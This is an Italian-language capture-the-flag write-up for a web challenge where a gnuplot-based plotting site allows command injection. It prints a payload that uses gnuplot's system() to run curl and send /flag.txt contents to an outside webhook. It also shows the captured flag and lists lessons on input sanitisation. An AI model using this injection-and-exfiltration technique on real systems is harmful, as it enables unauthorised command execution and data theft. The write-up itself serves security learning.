# Writeup: WS_1.04 - plottyboy

## Overview
- **Categoria**: Web  
- **Autore**: bonaff  
- **Difficoltà**: 494  
- **Stato**: Up (last checked: 7 minutes ago)  
- **URL**: [http://plottyboy.challs.cyberchallenge.it/](http://plottyboy.challs.cyberchallenge.it/)

## Descrizione 📝
La challenge propone un sito web che permette di inserire un’espressione matematica per tracciarne il grafico usando *gnuplot*. L’input viene quindi passato a gnuplot, ma senza adeguata sanitizzazione, permettendo di eseguire comandi arbitrari sul server.

## Soluzione 🎯

### 1. Individuazione della Vulnerabilità
Inserendo un’espressione come `x**2`, il sito genera correttamente un grafico di una parabola. Tuttavia, se introduciamo del codice che include un punto e virgola `;` seguito da comandi di sistema, potremmo eseguire code injection tramite gnuplot.

### 2. Exploit con `system()`
Proviamo a leggere il file `/flag.txt` inviando il contenuto a un nostro webhook:

```bash
x*2;system('curl https://webhook.site/7abedc77-d3eb-4ea9-8a94-f613d72088c8?flag=$(cat /flag.txt)');
```

- **`x*2;`**: parte dell’input interpretabile come espressione matematica, seguita da `;` per terminare l’istruzione di gnuplot.  
- **`system('curl ...')`**: chiamiamo `system()` dal contesto di gnuplot per eseguire un comando shell.  
- **`$(cat /flag.txt)`**: leggiamo il contenuto di `/flag.txt` e lo aggiungiamo alla richiesta GET verso il nostro webhook.

### 3. Ricezione della Flag
Sul nostro webhook (ad es. [Webhook.site](https://webhook.site/)) riceveremo una richiesta contenente la flag:

```
https://webhook.site/7abedc77-d3eb-4ea9-8a94-f613d72088c8?flag=CCITPl0ttyb01_4_A_sin3Boy
```

## Flag 🏁
```
CCIT{Pl0ttyb01_4_A_sin3Boy}
```

## Lezioni Apprese 📚
1. **Gnuplot Injection**: Le funzionalità di gnuplot possono eseguire comandi di sistema se non opportunamente filtrate.  
2. **Input Sanitization**: I parametri passati a comandi esterni (come gnuplot) devono essere convalidati per evitare exploit di injection.  
3. **Exfiltrazione Dati**: Usare `curl` verso un server controllato dall’attaccante è un metodo comune per estrarre informazioni sensibili.

## Tools Utilizzati 🛠️
- **Browser Web**: Per interagire con il sito e testare l’input malevolo.  
- **Webhook.site**: Per ricevere la flag esfiltrata.  
- **GNUPlot Knowledge**: Per capire la sintassi e come iniettare comandi.

---

*Writeup by Luca Crippa - Last Updated: 2024*
